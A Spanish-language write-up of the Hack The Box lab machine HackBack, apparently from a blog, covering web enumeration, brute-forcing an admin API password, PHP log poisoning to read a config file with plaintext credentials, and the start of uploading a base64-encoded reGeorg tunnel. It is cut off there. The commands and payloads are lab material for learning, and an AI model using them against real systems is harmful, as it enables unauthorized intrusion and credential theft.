---
layout: post
title: HackBack
date: 2023-03-29
description:
img:
fig-caption:
tags: [eWPT, OSCP (Escalada), eWPTXv2, eCPTX]
---
___

<center><img src="/writeups/assets/img/HackBack-htb/Hackback.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Information Disclosure

* Fuerza bruta de contraseña

* Log Poisoning

* Internal Port Discovery

* Creación de Proxy por SOCKS5

* Acceso por WINRM

* Abuso de tarea CRON

* Abuso del Privilegio SeImpersonatePrivilege

* Uso de Named Pipes

* Impersonación de Usuario

* Bypass de reglas de Firewall

* Exfiltración de datos

* Uso de ADS

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.128 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 16:28 GMT
Nmap scan report for 10.10.10.128
Host is up (0.26s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
6666/tcp  open  irc
64831/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 28.29 seconds
```

Agrego el dominio ```hackback.htb``` al ```/etc/hosts```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80,6666,64831 10.10.10.128 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 16:29 GMT
Nmap scan report for 10.10.10.128
Host is up (0.059s latency).

PORT      STATE SERVICE     VERSION
80/tcp    open  http        Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
6666/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
64831/tcp open  ssl/unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /login?next=%2F
|     Set-Cookie: _gorilla_csrf=MTY4MDEzMjYxNHxJblZaV1c5SVFrVkZlRzF2Wm1GNVduTkNjazFHY0V0VGNFWlpRUzlCT1RjMFowWnNXRzh2YkVoRlJGazlJZ289fGvclugHshc_15rwok-OxCHpzDeIlFWw29rHCC670N2V; HttpOnly; Secure
|     Vary: Accept-Encoding
|     Vary: Cookie
|     Date: Wed, 29 Mar 2023 23:30:14 GMT
|     Content-Length: 38
|     href="/login?next=%2F">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Location: /login?next=%2F
|     Set-Cookie: _gorilla_csrf=MTY4MDEzMjYxNHxJalppU1RoUVEzWkZjRUV4WmtaSlltNUNWV1JpTjB4V1dFcGFTM0UyVHpJNFRrTkJRalpSTUhablkzYzlJZ289fNI-kMK-2EpI5rLUFpfNoNlEYvEO2broGDRtrFB9eduH; HttpOnly; Secure
|     Vary: Accept-Encoding
|     Vary: Cookie
|     Date: Wed, 29 Mar 2023 23:30:14 GMT
|_    Content-Length: 0
| ssl-cert: Subject: organizationName=Gophish
| Not valid before: 2018-11-22T03:49:52
|_Not valid after:  2028-11-19T03:49:52
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port64831-TCP:V=7.93%T=SSL%I=7%D=3/29%Time=64246796%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(GetRequest,19B,"HTTP/1\.0\x20302\x20Found\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nLocation:\x20/login\?next=%2
SF:F\r\nSet-Cookie:\x20_gorilla_csrf=MTY4MDEzMjYxNHxJblZaV1c5SVFrVkZlRzF2W
SF:m1GNVduTkNjazFHY0V0VGNFWlpRUzlCT1RjMFowWnNXRzh2YkVoRlJGazlJZ289fGvclugH
SF:shc_15rwok-OxCHpzDeIlFWw29rHCC670N2V;\x20HttpOnly;\x20Secure\r\nVary:\x
SF:20Accept-Encoding\r\nVary:\x20Cookie\r\nDate:\x20Wed,\x2029\x20Mar\x202
SF:023\x2023:30:14\x20GMT\r\nContent-Length:\x2038\r\n\r\n<a\x20href=\"/lo
SF:gin\?next=%2F\">Found</a>\.\n\n")%r(HTTPOptions,14C,"HTTP/1\.0\x20302\x
SF:20Found\r\nLocation:\x20/login\?next=%2F\r\nSet-Cookie:\x20_gorilla_csr
SF:f=MTY4MDEzMjYxNHxJalppU1RoUVEzWkZjRUV4WmtaSlltNUNWV1JpTjB4V1dFcGFTM0UyV
SF:HpJNFRrTkJRalpSTUhablkzYzlJZ289fNI-kMK-2EpI5rLUFpfNoNlEYvEO2broGDRtrFB9
SF:eduH;\x20HttpOnly;\x20Secure\r\nVary:\x20Accept-Encoding\r\nVary:\x20Co
SF:okie\r\nDate:\x20Wed,\x2029\x20Mar\x202023\x2023:30:14\x20GMT\r\nConten
SF:t-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20char
SF:set=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Term
SF:inalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConne
SF:ction:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.16 seconds
```

## Puerto 80,6666 (HTTP) | Puerto 64831 (HTTPS)

Con ```whatweb```, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.128
http://10.10.10.128 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.128], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
```

La página principal se ve así:

<img src="/writeups/assets/img/HackBack-htb/1.png" alt="">

No tiene nada de interés. En el puerto 6666, necesito conocer los parámetros para poder pasárselos

```null
curl -s -X GET http://10.10.10.128:6666/
"Missing Command!"
```

En el puerto 64831, hay un ```Gophish``` desplegado

<img src="/writeups/assets/img/HackBack-htb/2.png" alt="">

Encuentro un subdominio, ```admin```

```null
wfuzz -c -t 200 --hh=614 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.hackback.htb" http://hackback.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hackback.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000024:   200        27 L     66 W       825 Ch      "admin"                                                                                                                                        

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Lo añado al ```/etc/hosts```. Tengo acceso a un nuevo panel de autenticación

<img src="/writeups/assets/img/HackBack-htb/3.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://admin.hackback.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 300 --add-slash --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.hackback.htb/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/29 17:16:03 Starting gobuster in directory enumeration mode
===============================================================
/img/                 (Status: 403) [Size: 1233]
/css/                 (Status: 403) [Size: 1233]
/js/                  (Status: 403) [Size: 1233]
/logs/                (Status: 403) [Size: 1233]
/aspnet_client/       (Status: 403) [Size: 1233]
Progress: 26584 / 26585 (100.00%)
===============================================================
2023/03/29 17:16:22 Finished
===============================================================
```

Veo el código fuente

```null
curl -s -X GET http://admin.hackback.htb
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Admin Login</title>
    <link rel="stylesheet" href="/css/master.css">
<!-- <script SRC="js/.js"></script> -->
  </head>
  <body>

    <div class="login-box">
      <img src="img/logo.png" class="avatar" alt="Avatar Image">
      <h1>Login Here</h1>
      <form action="#" method="post">
        <!-- USERNAME INPUT -->
        <label for="username">Username</label>
        <input type="text" placeholder="Enter Username">
        <!-- PASSWORD INPUT -->
        <label for="password">Password</label>
        <input type="password" placeholder="Enter Password">
        <input type="submit" value="Log In">
        <a href="lost">Lost your Password?</a><br>
        <a href="signup">Don't have An account?</a>
      </form>
    </div>
  </body>
</html>
```

Está ocultando el archivo ```js/.js```. Encuentro uno en ese directorio

```null
gobuster fuzz -u http://admin.hackback.htb/js/FUZZ.js -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 300 -b 404 --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.hackback.htb/js/FUZZ.js
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Excluded Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/29 17:21:00 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=2904] http://admin.hackback.htb/js/private.js
```

Me lo descargo para ver su contenido

```null
wget http://admin.hackback.htb/js/private.js
js-beautify private.js | sponge private.js
```

Está en ROT13. Desde CyberChef le hago el proceso inverso. Al principio, se están declarando varias variables

```null
var a = ['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33', '\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d', '\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];
```

Desde una consola interactiva de JavaScript, las interpreto y veo el valor del resto

```null
var x = '\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';
var z = b('0x0', '\x50\x5d\x53\x36');
var h = b('0x1', '\x72\x37\x54\x59');
var y = b('0x2', '\x44\x41\x71\x67');
var t = '\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';
var s = '\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';
var i = '\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';
var k = '\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';
var w = '\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
```

<img src="/writeups/assets/img/HackBack-htb/4.png" alt="">

La ruta que se leakea existe en ```admin.hackback.htb```, pero aplica un redirect

```null
curl -s -X GET http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578 -I
HTTP/1.1 301 Moved Permanently
Content-Type: text/html; charset=UTF-8
Location: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 30 Mar 2023 15:54:57 GMT
Content-Length: 182
```

Encuetro un archivo en PHP bajo ese directorio

```null
gobuster fuzz -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -b 404
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ.php
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Excluded Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/30 09:03:36 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=302] [Length=0] http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php
```

Para poder comunicarme con la API necesito disponer de una cookie de sesión

```null
curl -s -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=twitter&password=test&session='
Wrong secret key!
```

Introduzco mi PHPSESSID

```null
curl -s -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=twitter&password=test&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845'
Wrong secret key!
```

Aplico fuerza bruta para la contraseña

```null
wfuzz -c --hh=0,17 -t 200 -w /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=twitter&password=FUZZ&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=twitter&password=FUZZ&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000003:   302        5 L      9 W        37 Ch       "12345678"
```

Ahora ya no tengo este error

```null
curl -s -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=twitter&password=12345678&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845'
Array
(
    [0] => .
    [1] => ..
)
```

Si el valor de la acción es ```exec```, devuelve lo siguiente:

```null
curl -s -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=exec&site=twitter&password=12345678&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845'
Missing command
```

Encuentro un LOG

```null
for i in twitter paypal facebook hackthebox; do echo -e "\n[+] $i"; curl -s -X GET "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=$i&password=12345678&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845"; done

[+] twitter
Array
(
    [0] => .
    [1] => ..
)

[+] paypal
Array
(
    [0] => .
    [1] => ..
)

[+] facebook
Array
(
    [0] => .
    [1] => ..
)

[+] hackthebox
Array
(
    [0] => .
    [1] => ..
    [2] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```

En el puerto 64831, estaba desplegado un Gophish. Tiene las credenciales por defecto, ```admin:gophish```. Miro el código de la plantilla de HackTheBox

<img src="/writeups/assets/img/HackBack-htb/5.png" alt="">

Aparece un dominio que no es el oficial de la web. Lo agrego al ```/etc/hosts```

```null
cat data | grep -oP '".*?"' | grep http
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
"http://www.hackthebox.htb"
```

Corresponde a un clon del inicio de sesión de la antigua interfaz de HTB

<img src="/writeups/assets/img/HackBack-htb/6.png" alt="">

Se está empleando PHP

<img src="/writeups/assets/img/HackBack-htb/7.png" alt="">

Al cargarla, genera otro LOG

```null
curl -s -X GET "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=12345678&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845"
Array
(
    [0] => .
    [1] => ..
    [2] => 92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845.log
    [3] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```

El PHPSESSID de esta ocasión si que es válido

```null
curl -s -X GET "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845"
[30 March 2023, 02:58:42 PM] 10.10.16.2 - Username: , Password: [30 March 2023, 02:59:05 PM] 10.10.16.2 - Username: , Password:
```

Mi input se ve reflejado en el output. El código PHP que introduzco se interpreta

```null
<?php echo "Testing"; ?>
```

```null
curl -s -X GET "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845"
[30 March 2023, 02:58:42 PM] 10.10.16.2 - Username: , Password: [30 March 2023, 02:59:05 PM] 10.10.16.2 - Username: , Password: [30 March 2023, 03:03:40 PM] 10.10.16.2 - Username: , Password: [30 March 2023, 03:06:37 PM] 10.10.16.2 - Username: , Password: [30 March 2023, 03:07:22 PM] 10.10.16.2 - Username: Testing, Password: Testing
```

Pero funciones como ```system```, o ```shell_exec``` están deshabilitadas. Listo el contenido del directorio actual con funciones propias del PHP

```null
<?php print_r(scandir(".")); ?>
```

```null
[2] => index.html
[3] => webadmin.php
```

Lo mismo para un directorio hacia atrás

```null
<?php print_r(scandir("../")); ?>
```

```null
[2] => 2bb6916122f1da34dcd916421e531578
[3] => App_Data
[4] => aspnet_client
[5] => css
[6] => img
[7] => index.php
[8] => js
[9] => logs
[10] => web.config
[11] => web.config.old
```

Cargo el archivo ```web.config.old```

```null
<?php echo file_get_contents("../web.config.old"); ?>
```

```null
<configuration>
    <system.webServer>
        <authentication mode="Windows">
        <identity impersonate="true"                 
            userName="simple" 
            password="ZonoProprioZomaro:-("/>
     </authentication>
        <directoryBrowse enabled="false" showFlags="None" />
    </system.webServer>
</configuration>
```

Obtengo credenciales en texto claro

Fuzzeo comandos en el puerto 6666

```null
gobuster dir -u http://10.10.10.128:6666 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 40
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.128:6666
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/30 15:24:02 Starting gobuster in directory enumeration mode
===============================================================
/help                 (Status: 200) [Size: 54]
/info                 (Status: 200) [Size: 6516]
/services             (Status: 200) [Size: 35702]
/list                 (Status: 200) [Size: 436]
/.                    (Status: 200) [Size: 18]
/proc                 (Status: 200) [Size: 8255]
/hello                (Status: 200) [Size: 15]
/whoami               (Status: 200) [Size: 13114]
Progress: 56271 / 56294 (99.96%)
===============================================================
2023/03/30 15:25:25 Finished
===============================================================
```

Puedo listar todos los comandos con ```help```

```null
curl -s -X GET 'http://10.10.10.128:6666/help'
"hello,proc,whoami,list,info,services,netsat,ipconfig"
```

Listo los puertos internos que están abiertos

```null
curl -s -X GET 'http://10.10.10.128:6666/netstat' | grep -oP '".*?"' | grep "LocalPort =" | tr -d '"' | awk 'NF{print $NF}' | sort -u
135
139
3389
445
47001
49664
49665
49666
49667
49668
49669
49670
5985
64831
6666
80
8080
```

Como el puerto 5985 está abierto internamente, puedo intentar subir un archivo ASPX que se encargue de montarme un proxy por SOCKS5 que me permita tener alcance con este. Voy a utilizar una herramienta llamada [Regorg](https://github.com/sensepost/reGeorg)

```null
<?php file_put_contents("tunnel.aspx",base64_decode("PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICA